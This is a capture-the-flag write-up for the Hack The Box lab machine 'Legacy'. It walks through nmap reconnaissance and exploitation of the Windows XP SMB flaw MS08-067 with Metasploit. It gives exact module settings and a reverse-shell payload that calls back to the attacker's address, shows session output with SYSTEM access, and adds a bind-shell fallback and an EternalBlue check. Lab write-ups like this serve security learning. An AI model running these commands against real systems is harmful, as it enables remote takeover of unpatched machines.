# HTB Legacy — Writeup
**OS:** Windows XP Professional SP3  
**Difficulty:** Easy  
**Attack Vector:** MS08-067 (CVE-2008-4250)  
**System:** Arch Linux  

---

## Summary

Legacy is a Windows XP machine vulnerable to MS08-067, a critical remote code execution vulnerability in the Windows Server service via SMB. Exploitation grants immediate `NT AUTHORITY\SYSTEM` access with no privilege escalation required. The machine is also vulnerable to MS17-010 (EternalBlue) — same vuln as HTB Blue.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV 10.129.227.181
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
```

Windows XP + SMB open = red flag immediately.

### Generic Vuln Scan
```bash
nmap -p 135,139,445 --script vuln 10.129.227.181
```

Generic scan didn't catch it — MS08-067 requires the `unsafe=1` flag since it's an intrusive check.

### Targeted MS08-067 Check
```bash
nmap -p 139,445 --script smb-vuln-ms08-067 --script-args unsafe=1 10.129.227.181
```

```
smb-vuln-ms08-067:
  VULNERABLE:
  Microsoft Windows system vulnerable to remote code execution (MS08-067)
  CVE: CVE-2008-4250
  State: VULNERABLE
```

Confirmed vulnerable. MS08-067 is a stack buffer overflow in the Server service triggered via a crafted RPC request — same family of SMB vulns as EternalBlue, just older.

---

## Exploitation

### Metasploit Setup
```bash
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.129.241.101
set RPORT 445
set TARGET 6
set payload windows/shell_reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

> **Important:** Use `windows/shell_reverse_tcp` NOT `windows/x64/shell_reverse_tcp` — XP is 32-bit!

> **Target 6** = Windows XP SP3 English (AlwaysOn NX) — confirmed by MSF's auto-detection fingerprint.

### Successful Output
```
[*] Started reverse TCP handler on 10.10.16.59:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 1 opened
```

---

## Flags

> **Note:** Windows XP uses `Documents and Settings` not `Users`!

```cmd
whoami
# nt authority\system

type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| Generic `--script vuln` missed MS08-067 | Use `--script smb-vuln-ms08-067 --script-args unsafe=1` explicitly |
| `STATUS_ACCESS_DENIED` on pipe | Unset SMBPIPE and let MSF handle it automatically |
| `STATUS_OBJECT_NAME_NOT_FOUND` | Wrong pipe set manually — unset it |
| Wrong payload arch | XP is 32-bit — use `windows/shell_reverse_tcp` not `windows/x64/...` |
| Bind shell needed | If reverse shell fails, `set payload windows/shell/bind_tcp` connects TO the target instead |
| `Documents and Settings` not `Users` | XP path structure is different from Vista+ |

---

## Bonus — Also Vulnerable to MS17-010

Legacy also runs SMBv1 and is vulnerable to EternalBlue:

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.129.241.101
# State: VULNERABLE — CVE-2017-0143
```

Could have been rooted either way.

---

## Tools Used

- `nmap` — reconnaissance and vuln scanning
- `metasploit` (`exploit/windows/smb/ms08_067_netapi`) — exploitation

---

*Two machines down. The older the OS, the easier the root.* 🏆
